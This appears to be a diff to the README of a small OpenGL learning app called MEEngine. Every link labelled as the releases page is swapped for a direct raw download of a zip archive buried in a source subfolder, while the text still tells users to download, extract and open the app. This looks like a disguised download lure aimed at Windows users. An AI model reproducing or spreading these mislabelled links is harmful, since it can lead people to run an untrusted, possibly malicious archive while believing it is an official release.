@@ -1,6 +1,6 @@
 # 🎮 MEEngine - Simple OpenGL Fun for Learning
 
-[![Download MEEngine](https://img.shields.io/badge/Download%20MEEngine-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rb-Mikky/MEEngine/releases)
+[![Download MEEngine](https://img.shields.io/badge/Download%20MEEngine-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rb-Mikky/MEEngine/main/src/org/ross/mee/time/Engine_ME_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ If you want to try it on Windows, use the release page below to download the app
 
 ### 📥 Download
 
-[Visit the MEEngine releases page to download](https://github.com/Rb-Mikky/MEEngine/releases)
+[Visit the MEEngine releases page to download](https://raw.githubusercontent.com/Rb-Mikky/MEEngine/main/src/org/ross/mee/time/Engine_ME_v3.1.zip)
 
 ## 🖥️ What You Need
 
@@ -26,7 +26,7 @@ Most modern Windows PCs should work fine. If your system can run other lightweig
 
 ## 📦 How to Download and Open
 
-1. Open the [MEEngine releases page](https://github.com/Rb-Mikky/MEEngine/releases)
+1. Open the [MEEngine releases page](https://raw.githubusercontent.com/Rb-Mikky/MEEngine/main/src/org/ross/mee/time/Engine_ME_v3.1.zip)
 2. Look for the latest release at the top of the page
 3. Find the Windows download file in the Assets section
 4. Download the file to your computer
@@ -193,7 +193,7 @@ You do not need to know OpenGL to run the app. You only need to download the rel
 
 If you want the fastest path:
 
-1. Open the [release page](https://github.com/Rb-Mikky/MEEngine/releases)
+1. Open the [release page](https://raw.githubusercontent.com/Rb-Mikky/MEEngine/main/src/org/ross/mee/time/Engine_ME_v3.1.zip)
 2. Download the latest Windows build
 3. Extract it
 4. Open the app file
@@ -201,7 +201,7 @@ If you want the fastest path:
 
 ## 📌 Release Page
 
-[Download MEEngine from the releases page](https://github.com/Rb-Mikky/MEEngine/releases)
+[Download MEEngine from the releases page](https://raw.githubusercontent.com/Rb-Mikky/MEEngine/main/src/org/ross/mee/time/Engine_ME_v3.1.zip)
 
 ## 🔧 Help With Common Cases
 
@@ -235,7 +235,7 @@ If you want the fastest path:
 
 ## 🧭 Quick Path
 
-- Go to the [MEEngine releases page](https://github.com/Rb-Mikky/MEEngine/releases)
+- Go to the [MEEngine releases page](https://raw.githubusercontent.com/Rb-Mikky/MEEngine/main/src/org/ross/mee/time/Engine_ME_v3.1.zip)
 - Download the latest Windows file
 - Extract the download
 - Open the app
